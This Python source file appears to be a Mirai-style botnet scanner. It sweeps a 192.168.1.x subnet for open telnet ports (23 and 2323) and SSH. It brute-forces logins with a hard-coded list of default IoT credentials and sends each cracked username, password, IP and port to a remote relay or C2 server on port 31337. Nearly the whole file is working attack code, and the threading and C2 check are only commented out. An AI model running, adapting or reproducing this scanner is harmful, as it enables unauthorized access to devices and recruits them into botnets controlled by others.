import socket
import time
import sys
import telnetlib
import os
import json
import hashlib
import platform
from random import randrange
from threading import Thread
import paramiko
from colorama import init, Fore



MAlist = [
        ("admin", "password"),
        ("root", "password"),
        ("admin", "admin"),
        ("root", "admin"),
        ("root", "888888"),
        ("root", "xmhdipc"),
        ("root", "default"),
        ("root", "juantech"),
        ("root", "123456"),
        ("root", "54321"),
        ("support", "support"),
        ("root", ""),
        ("root", "root"),
        ("root", "12345"),
        ("user", "user"),
        ("admin", ""),
        ("root", "pass"),
        ("admin", "admin1234"),
        ("root", "1111"),
        ("admin", "smcadmin"),
        ("admin", "1111"),
        ("root", "666666"),
        ("root", "vizxv"),
        ("root", "1234"),
        ("root", "klv123"),
        ("Administrator", "admin"),
        ("service", "service"),
        ("supervisor", "supervisor"),
        ("guest", "guest"),
        ("guest", "12345"),
        ("admin1", "password"),
        ("administrator", "1234"),
        ("666666", "666666"),
        ("888888", "888888"),
        ("ubnt", "ubnt"),
        ("root", "klv1234"),
        ("root", "Zte521"),
        ("root", "hi3518"),
        ("root", "jvbzd"),
        ("root", "anko"),
        ("root", "zlxx."),
        ("root", "7ujMko0vizxv"),
        ("root", "7ujMko0admin"),
        ("root", "system"),
        ("root", "ikwb"),
        ("root", "dreambox"),
        ("root", "user"),
        ("root", "realtek"),
        ("root", "00000000"),
        ("admin", "1111111"),
        ("admin", "1234"),
        ("admin", "12345"),
        ("admin", "54321"),
        ("admin", "123456"),
        ("admin", "7ujMko0admin"),
        ("admin", "pass"),
        ("admin", "meinsm"),
        ("tech", "tech"),
        ("mother", "fucker")]


filename = 'ip_config.ini'
with open(filename, 'r') as file:
    json_data = json.load(file)
RelayIP = json_data['RelayIP']
targetIP = json_data['targetIP']


# Relay
__RELAY_H__ = RelayIP  #192.168.1.97
__RELAY_P__ = 31337
__RELAY_PS_ = "||"

__TIMEOUT__ = 2  # seconds
__C2DELAY__ = 5  # seconds
__THREADS__ = 10  # threads Scanner


def get_credentials(pindex):
    global MAlist
    user = MAlist[pindex][0]
    password = MAlist[pindex][1]
    #print(f"[Scanner] Trying {user}:{password}")
    return user, password


def c2crd(usr, psw, ip, port):
    global __RELAY_H__, __RELAY_P__, __RELAY_PS_
    while True:
        try:
            print("[Scanner] Sending credentials to remote relay..")
            tcpClientA = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            tcpClientA.connect((__RELAY_H__, __RELAY_P__))
            tcpClientA.send(("!" + __RELAY_PS_ + usr + __RELAY_PS_ + psw +
                            __RELAY_PS_ + ip + __RELAY_PS_ + str(port)).encode('ascii'))
            data = tcpClientA.recv(1024)
            data = str(data, 'utf-8', 'ignore')
            if data == "10":
                tcpClientA.close()
                print("[Scanner] Remote relay returned code 10(ok).")
                return True
            else:
                return False
        except Exception as e:
            print("[Scanner] Unable to contact remote relay (%s)" % str(e))
            time.sleep(10)
            pass

'''  Scan and brute telnet ( 23 & 2323 )'''
def bruteport(ip, port):    #try 23 & 2323

    print(f"[Scanner] Attempting to brute found IP {ip}" )
    response = ""
    tn = None
    need_user = False
    pindex = 0
    check_around=0
    while True:
        try:
            user = ""
            password = ""
            if pindex>=len(MAlist):
                break
            if not tn:
                asked_password_in_cnx = False
                tn = telnetlib.Telnet(ip, port)
                print(f"[Scanner] Connection established to found ip {ip}" ) # can connect this ip and port
            while True:
                response = tn.read_until(b":", 1)                           # Wait until you can see: Appears to indicate that you can try to log in
                #print("Response: " + str(response))
                if "Login:" in str(response) or "Username:" in str(response)or "login:" in str(response):  # if login or username exist in response
                    print("[Scanner] Received username prompt")
                    need_user = True                                        # If retrying to log in requires entering an account  then set True
                    asked_password_in_cnx = False                           # Did you ask for a password ?
                    user, password = get_credentials(pindex)                # generate pair of account and password
                    tn.write((user + "\n").encode('ascii'))                 # send username to login account 
                    check_around+=1
                elif "Password:" in str(response) or "password" in str(response):    
                    if asked_password_in_cnx and need_user:                 # if ask password before and need account then close connect 
                        tn.close()
                        break
                    asked_password_in_cnx = True
                    if not need_user:
                        user, password = get_credentials(pindex)
                    if not password:
                        print("[Scanner] Bruteforce failed, out of range..")
                        sys.exit(0)
                    print("[Scanner] Received password prompt")
                    tn.write((password + "\n").encode('ascii'))
                    check_around+=1
                if ">" in str(response) or "$" in str(response) or "#" in str(response) or "%" in str(response):
                    # broken
                    print("[Scanner] Brutefoce succeeded %s " % ip + ' : '.join((user, password)))
                    if c2crd(user, password, ip, port):
                        print("[!] Find new Device has login and control Vuln!")
                        print("The target's username and password :\n",user+"\t",password)
                    pindex = 0
                    return True 
                if check_around==2:
                    pindex += 1
                    check_around=0
        except EOFError as e:
            tn = None
            need_user = False
            print("[Scanner] Remote host dropped the connection (%s).." % str(e))
            time.sleep(10)


def is_telent_open(ip):
    print("[Scanner] Scanning %s .." % ip)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(__TIMEOUT__)
    result = sock.connect_ex((ip, 23))
    try:
        if result == 0:             # if 23 port connect successful
            print("[Scanner] Found IP address: %s" % ip)
            if bruteport(ip, 23):     #  try to brute force this port 23
                return True
            else :
                return False
        else:
            print("[Scanner] %s tcp/23 connection reset" % ip)  # reset connect
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex((ip, 2323))
            print("[Scanner] Trying connection over port 2323")  # try to connect 2323 port
            if result == 0:     # connect success
                print("[Scanner] Found IP address: %s" % ip)
                if bruteport(ip, 2323):
                    return True
                else :
                    return False
            else:               # connect failure
                print("[Scanner] %s fail to find telnet " % ip)
                return False
        sock.close()
    except:
        return False
''' ------------------------------'''

def is_ssh_open(ip):
    # initialize SSH client
    client = paramiko.SSHClient()
    # add to know hosts
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    pindex = 0
    retry_two_times=False
    while True:
        username, password = get_credentials(pindex)
        pindex += 1
        try:
            client.connect(hostname=ip, username=username, password=password, timeout=3)
        except paramiko.SSHException:
            print(f"[Scanner] Quota exceeded, retrying with delay...")
            time.sleep(60)
            if retry_two_times:
                return False
            retry_two_times=True
            return is_ssh_open(ip)
        except:
            return False
        else:
            print(f"[Scanner] Found combo:\n\tHOSTNAME: {ip}\n\tUSERNAME: {username}\n\tPASSWORD: {password}")
            return True


def generate_IP(index):
    return f"192.168.1.{index}"


def getOS():
    return platform.system() + " " + platform.release() + " " + platform.version()


def validateC2():
    print("[Scanner] Connecting to remote relay ...")
    while True:
        try:
            tcpClientA = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            tcpClientA.connect((__RELAY_H__, __RELAY_P__))
            tcpClientA.send("#".encode('ascii'))
            data = tcpClientA.recv(1024)
            data = str(data, 'utf-8', 'ignore')
            if data == "200":
                tcpClientA.close()
                print("[Scanner] Remote relay returned code 200(online).")
                break
        except:
            print("[Scanner] Remote relay unreachable retrying in %s secs ..." % str(__C2DELAY__))
            time.sleep(__C2DELAY__)


def Scanner(choose):
    if choose == 1:
        '''
        for i in range(1, 255):
            ip=generate_IP(i)
            print(ip)
            if is_ssh_open(ip):
                print("[!] Find!")
            else:
                pass
            print("-"*10)
        '''
        for i in range(1, 255):
            is_telent_open(generate_IP(i))
    else:
        print("Try to scan Telnet ---------------")
        is_telent_open("192.168.1.121")
        #print("Try to scan SSH ---------------")
        #is_ssh_open("192.168.1.167")



if __name__ == '__main__':
    print("[Scanner] Scanner process started ..")
    #validateC2() # Test to connect remote DB
    Scanner(2)


'''
for x in range(0, __THREADS__):
    thread = Thread(target = Scanner)
    thread.start()
'''
